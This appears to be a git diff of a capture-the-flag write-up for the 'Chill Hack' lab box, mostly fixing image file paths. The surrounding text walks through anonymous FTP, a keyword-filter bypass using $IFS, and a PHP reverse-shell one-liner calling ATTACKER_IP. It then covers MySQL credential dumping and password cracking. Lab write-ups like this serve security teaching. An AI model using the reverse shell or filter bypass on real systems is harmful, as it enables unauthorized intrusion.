@@ -10,7 +10,7 @@ excerpt_separator: <!--more-->
 <p>Start by enumerating  ports with an NMAP Scan.</p>
 <p>In the output below we can see that FTP (port 21) and SSH (port 22) are open. There’s also an apache  web server running on port 80</p>
 <p>First let see what's in the note.txt file on the FTP service since anonymous login is allowed</p>
-<img src="/img/chatterbox/1.nmap.png">
+<img src="/img/chillhack/1.nmap.png">
 
 <p>login with “anonymous:anonymous” </p>
 <img src="/img/chillhack/2.ftp-login.png">
@@ -40,10 +40,10 @@ excerpt_separator: <!--more-->
 <img src="/img/chillhack/9.id-input.png">
 
 <p>First let’s set up a listener on our attacking machine to catch the shell.</p>
-<img src="/img/chillhack/10.nc-listner">
+<img src="/img/chillhack/10.nc-listner.png">
 
 <p>Okay, I didn't think it would be that easy. This must be what the note.txt in the FTP server was speaking about. There filtering out some keywords - “nc” appears to be one on the list</p>
-<img src="/img/chillhack/11.nc-fail">
+<img src="/img/chillhack/11.nc-fail.png">
 
 <p>I tried using Burp Suite to send the POST request to try and bypass any client side scripting that may be filtering input data. That didn’t work</p>
 <img src="/img/chillhack/12.burp.png">
@@ -52,10 +52,10 @@ excerpt_separator: <!--more-->
 <img src="/img/chillhack/13.input-trick.png">
 
 <p>Altho this trick worked I couldn’t get a shell to “pop” using any net cat commands. I used a PHP one-liner and “popped” a reverse shell: php$IFS$9-r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'  </p>
-<img src="/img/chillhack/14.php-1liner">
+<img src="/img/chillhack/14.php-1liner.png">
 
 <p>And we have a non interactive shell running as www-data. Let’s upgrade this to pseudo interactive.</p>
-<img src="/img/chillhack/15.first-shell">
+<img src="/img/chillhack/15.first-shell.png">
 
 <p>Using this python 3 command we can get a pseudo interactive shell and start enumerating.</p>
 <img src="/img/chillhack/16.psudo-i-shell.png">
@@ -67,13 +67,13 @@ excerpt_separator: <!--more-->
 <img src="/img/chillhack18.mysql-creds.png/">
 
 <p>We’re connected to the SQL database. Let’s begin enumerating.</p>
-<img src="/img/chillhack/19.mysql-login">
+<img src="/img/chillhack/19.mysql-login.png">
 
 <p>The webportal table looks interesting. Let’s see what  tables it has.. </p>
-<img src="/img/chillhack/20.mysql-tables">
+<img src="/img/chillhack/20.mysql-tables.png">
 
 <p>Let’s see if we can get any user creds from this table.</p>
-<img src="/img/chillhack/21.mysql-table">
+<img src="/img/chillhack/21.mysql-table.png">
 
 <p>Great, we have usernames and passwords. These passwords are hashed with  MD5. Let see if Crakstation.net can crack these before we try hashcat</p>
 <img src="/img/chillhack/22.user-password-hashed.png">
@@ -85,16 +85,16 @@ excerpt_separator: <!--more-->
 <img src="/img/chillhack/">
 
 <p>Using steghide I was able to extract a file named backup.zip. Let’s unzip and see what’s inside.</p>
-<img src="/img/chillhack/24.backup-.zip-file">
+<img src="/img/chillhack/24.backup-.zip-file.png">
 
 <p>It’s password protected. I tried the three passwords I captured earlier but these didn’t work. let ‘s try and bruteforce the password.</p>
 <img src="/img/chillhack/25.unzip-pass-pro.png">
 
 <p>using fcrackzip and the rockyou password list it quickly found the password.</p>
-<img src="/img/chillhack/26.zip_password-cracked">
+<img src="/img/chillhack/26.zip_password-cracked.png">
 
 <p>using fcrackzip and the rockyou password list it quickly found the password.</p>
-<img src="/img/chillhack/26.zip_password-cracked">
+<img src="/img/chillhack/26.zip_password-cracked.png">
 
 <p>Let’s see what’s inside. When we unzip the file we find another file named source_code.php. There’s credentials hardcoded in this php, but it’s base64 encoded.</p>
 <img src="/img/chillhack/27.creds-again.png">
